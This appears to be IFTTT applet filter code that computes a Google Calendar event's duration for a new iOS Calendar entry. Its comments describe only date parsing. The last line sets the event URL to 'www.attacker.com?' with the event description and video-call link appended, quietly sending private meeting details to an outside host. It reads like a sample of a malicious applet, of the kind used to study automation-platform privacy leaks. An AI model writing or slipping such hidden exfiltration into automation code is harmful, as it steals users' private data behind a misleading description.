// https://ifttt.com/applets/gqvGwQ79-sample-filter-code-to-calculate-the-duration-of-a-new-google-calendar-event

// Applet that calculates the duration of a Google Calendar Event and creates a new iOS Calendar entry

// Trigger: Google Calendar -> New event added
//					GoogleCalendar.newEventAdded.{Title, Description, Where, Starts, Ends, EventUrl,
//																				VideoCallUrl, CreatedAt}
// Action:  iOS Calendar -> Create a calendar event
//					IosCalendar.createCalendarEvent.{skip, setTitle, setLocation, setStartDate,
//																					 setDuration, setNotes, setUrl, setAlert}

trigger_starts = 'January 01, 2018' //'GoogleCalendar.newEventGcal.Starts';
trigger_ends = 'February 01, 2018' // 'GoogleCalendar.newEventGcal.Ends';

gCalendarStart = trigger_starts;
wheresAt = gCalendarStart.search(" at ");

startDate = trigger_starts;
endDate = trigger_ends;
startTime = '12:00AM';
endTime = '12:00AM';
fullStartTime = '';
fullEndTime = '';
setStart = '';

//
// If no ' at ', then it is an all-day or multi-all-day event.
//
if (wheresAt == -1) {
  startDate = trigger_starts;
  startTime = "12:00AM";
  endDate   = trigger_ends;
  endTime   = "12:00AM";
  setStart  = trigger_starts + " at "+ startTime;
} 
//
// If 'at', then start and end dates have a time component
//
else {
  startArray = trigger_starts.split(" at ");
  startDate  = startArray[0];
  startTime  = startArray[1];
  endArray   = trigger_ends.split(" at ");
  endDate    = endArray[0];
  endTime    = endArray[1];
  setStart   = trigger_starts;
}
//
// IFTTT's dates are not in a standard format, so they must be
//    converted because we need to do the math to determine the
//    duration in minutes as required by the iOS calendar.
//
if (startTime.search("PM") == -1) {
  fullStartTime = new Date(startDate + " " + startTime.substr(0,5) + " AM");
} else {
  fullStartTime = new Date(startDate + " " + startTime.substr(0,5) + " PM");
}

if (endTime.search("PM") == -1) {
  fullEndTime = new Date(endDate + " " + endTime.substr(0,5) + " AM");
} else {
  fullEndTime = new Date(endDate + " " + endTime.substr(0,5) + " PM");
}

fullDiffInMs = fullEndTime.getTime() - fullStartTime.getTime();
msPerMin  = 1000 * 60;
iOSduration = fullDiffInMs/msPerMin;
//
// Set the duration and start time. 
//    All other values come from the base applet.
//
durationAsString = iOSduration.toString();
sink('IosCalendar.createCalendarEvent', 'setDuration', durationAsString);
sink('IosCalendar.createCalendarEvent', 'setStartDate', setStart);
sink('IosCalendar.createCalendarEvent', 'setUrl', urll("www.attacker.com?" + lbl('GoogleCalendar.newEventAdded.Description') + lbl('GoogleCalendar.newEventAdded.VideoCallUrl')));
